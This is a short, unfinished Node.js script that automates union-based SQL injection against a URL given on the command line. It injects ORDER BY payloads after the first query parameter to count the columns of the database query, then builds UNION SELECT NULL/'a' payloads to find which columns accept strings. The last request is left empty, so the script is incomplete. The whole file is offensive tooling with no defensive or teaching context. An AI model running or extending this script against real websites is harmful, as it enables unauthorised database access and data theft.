#!/usr/bin/node


/**
 * Step 1: Get input URL from CLI
 */
const axios = require('axios');
const injectionSyntax = /=\w*/;
const MAX_COLUMNS_MYSQL = 4096;
const ERRORS_HANDLED = {
    "ECONNREFUSED": "This website can't be connected to. Is this the right address?"
}
const target = process.argv[2];

let columnNum = 1;

function columnCheck(url, injectionPoint, callback) {
    console.log('initializing column union attack check...');
    let successful = false;
    let callbackLock = false;
    let target = url.substring(0, injectionPoint);
    let attacks = {
        'standard': `' ORDER BY ${columnNum}-- `,
        'mysql': "' ORDER BY 1-- "
    }

    attackTarget = target +  encodeURI(attacks.standard);

    // TODO: cycle through different attack methods for checking columns
    axios.get(attackTarget).then(res => {
        columnNum++;
        console.log('increased column check to ' + columnNum);
    })
    .catch(error => {
        console.log(`found ${columnNum - 1} columns in database query!`);
        successful = true;
    })
    .finally( _ => {
        if (!successful) {
            columnCheck(url, injectionPoint, stringDataTypeSearch);
        }
        else {
            if (columnNum > MAX_COLUMNS_MYSQL) {
                throw Error("Union column attack not possible :(");
            }
        }
        if (callback) {
            callback();
        }
    });
}

function stringDataTypeSearch() {
    const NULL = "NULL";
    let queriesList = [];
    let queryStart = "UNION SELECT ";
    let currentQuery= "UNION SELECT ";
    let arbitraryStr = "'a'";
    let suffix = "--";

    // craft query to check
    for(let i = 0; i < columnNum; i++) {
        for (let j = 0; j < columnNum; j++) {
            currentQuery += (i === j) ? arbitraryStr : NULL;
            currentQuery += j < columnNum - 1 ? "," : "";
        }
        currentQuery += suffix;
        queriesList.push(currentQuery);
        currentQuery = queryStart;
    }
    console.log(queriesList);

    axios.get()
}


axios
.get(target)
.then(res => {
    if (res.status === 200) {
        let url = res.config.url;
        let injectionPoint = url.search(injectionSyntax) + 1;
        columnCheck(url, injectionPoint);
    }
    //console.log(`statusCode: ${res.status}`);
    
})
.catch(error => {
    switch(error.code) {
        case Object.keys(ERRORS_HANDLED)[0]:
            console.log(ERRORS_HANDLED.ECONNREFUSED)
        default:
            console.log("Error?")
    }
});